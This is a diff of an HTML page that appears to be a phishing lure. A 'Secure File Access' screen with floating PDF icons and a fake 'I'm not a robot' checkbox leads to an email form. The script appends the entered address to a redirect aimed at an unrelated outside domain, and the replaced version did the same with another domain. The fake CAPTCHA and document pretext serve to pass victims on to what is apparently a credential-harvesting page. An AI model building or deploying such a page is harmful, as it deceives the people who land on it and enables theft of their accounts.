@@ -1,100 +1,190 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Loading Experience</title>
-<style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: #0f172a;
-  color: white;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
-}
-.container {
-  text-align: center;
-}
-.spinner {
-  width: 50px;
-  height: 50px;
-  border: 5px solid #ccc;
-  border-top: 5px solid #3b82f6;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-  margin: 20px auto;
-}
-@keyframes spin {
-  100% { transform: rotate(360deg); }
-}
-.hidden {
-  display: none;
-}
-input {
-  padding: 10px;
-  width: 250px;
-  margin-top: 15px;
-  border-radius: 5px;
-  border: none;
-}
-button {
-  padding: 10px 20px;
-  margin-top: 10px;
-  background: #3b82f6;
-  border: none;
-  color: white;
-  border-radius: 5px;
-  cursor: pointer;
-}
-</style>
+  <meta charset="UTF-8">
+  <title>Secure File Access</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #0f172a;
+    }
+
+    /* Floating PDF background */
+    .bg {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      z-index: 0;
+    }
+
+    .pdf {
+      position: absolute;
+      width: 120px;
+      height: 150px;
+      background: white;
+      border-radius: 6px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      opacity: 0.08;
+      animation: float 20s linear infinite;
+    }
+
+    .pdf::after {
+      content: "PDF";
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      font-weight: bold;
+      color: #e11d48;
+      font-size: 14px;
+    }
+
+    @keyframes float {
+      from {
+        transform: translateY(100vh) rotate(0deg);
+      }
+      to {
+        transform: translateY(-120vh) rotate(360deg);
+      }
+    }
+
+    /* Random positions */
+    .pdf:nth-child(1) { left: 10%; animation-duration: 18s; }
+    .pdf:nth-child(2) { left: 25%; animation-duration: 22s; }
+    .pdf:nth-child(3) { left: 40%; animation-duration: 20s; }
+    .pdf:nth-child(4) { left: 60%; animation-duration: 24s; }
+    .pdf:nth-child(5) { left: 75%; animation-duration: 19s; }
+    .pdf:nth-child(6) { left: 90%; animation-duration: 23s; }
+
+    /* Card UI */
+    .card {
+      position: relative;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      width: 360px;
+      text-align: center;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      z-index: 1;
+    }
+
+    h2 {
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #666;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 6px;
+      background: #2563eb;
+      color: white;
+      cursor: pointer;
+    }
+
+    .checkbox {
+      margin-top: 15px;
+      text-align: left;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .fade {
+      animation: fadeIn 0.4s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(10px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-  <h2>Please wait...</h2>
-  <div class="spinner" id="spinner"></div>
-  <div id="status">Initializing...</div>
+<!-- Animated Background -->
+<div class="bg">
+  <div class="pdf"></div>
+  <div class="pdf"></div>
+  <div class="pdf"></div>
+  <div class="pdf"></div>
+  <div class="pdf"></div>
+  <div class="pdf"></div>
+</div>
 
-  <div id="formBox" class="hidden">
-    <h3>Enter your email</h3>
-    <input type="email" id="email" placeholder="you@example.com" />
-    <br>
-    <button onclick="submitEmail()">Continue</button>
+<!-- Main Card -->
+<div class="card">
+
+  <!-- CAPTCHA -->
+  <div id="captchaBox" class="fade">
+    <h2>Security Check</h2>
+    <p>Please confirm you're not a robot</p>
+
+    <div class="checkbox">
+      <label>
+        <input type="checkbox" onchange="unlockForm()">
+        I'm not a robot
+      </label>
+    </div>
   </div>
+
+  <!-- EMAIL FORM -->
+  <div id="formBox" class="hidden">
+    <h2>Access Files</h2>
+    <p>Enter your email to continue</p>
+
+    <input type="email" id="email" placeholder="you@example.com">
+    <button onclick="redirectUser()">Continue</button>
+  </div>
+
 </div>
 
 <script>
-const status = document.getElementById("status");
-const spinner = document.getElementById("spinner");
-const formBox = document.getElementById("formBox");
-
-setTimeout(() => status.textContent = "Loading...", 1500);
-setTimeout(() => status.textContent = "Preparing your file...", 3000);
-setTimeout(() => status.textContent = "Almost ready...", 4500);
-setTimeout(() => status.textContent = "Done!", 6000);
-
-setTimeout(() => {
-  spinner.style.display = "none";
-  status.style.display = "none";
-  formBox.classList.remove("hidden");
-}, 7500);
-
-function submitEmail() {
-  const email = document.getElementById("email").value;
-
-  if (!email) {
-    alert("Please enter an email");
-    return;
+  function unlockForm() {
+    document.getElementById("captchaBox").classList.add("hidden");
+    const form = document.getElementById("formBox");
+    form.classList.remove("hidden");
+    form.classList.add("fade");
   }
 
-  // Proper way: pass email as a query parameter
-  const encodedEmail = encodeURIComponent(email);
+  function cleanEmail(email) {
+    return email.toLowerCase().replace(/[^a-z0-9]/g, '');
+  }
 
-  // Replace with your real site later
-  window.location.href = "https://amniapartner.blog/docx11111111111111file/#" + encodedEmail;
-}
+  function redirectUser() {
+    const email = document.getElementById("email").value.trim();
+
+    if (!email) {
+      alert("Please enter your email.");
+      return;
+    }
+
+    const safe = cleanEmail(email);
+    const url = "https://globalspainting.com/22236467334p93893ue32#" + safe + ".com";
+
+    window.location.href = url;
+  }
 </script>
 
 </body>
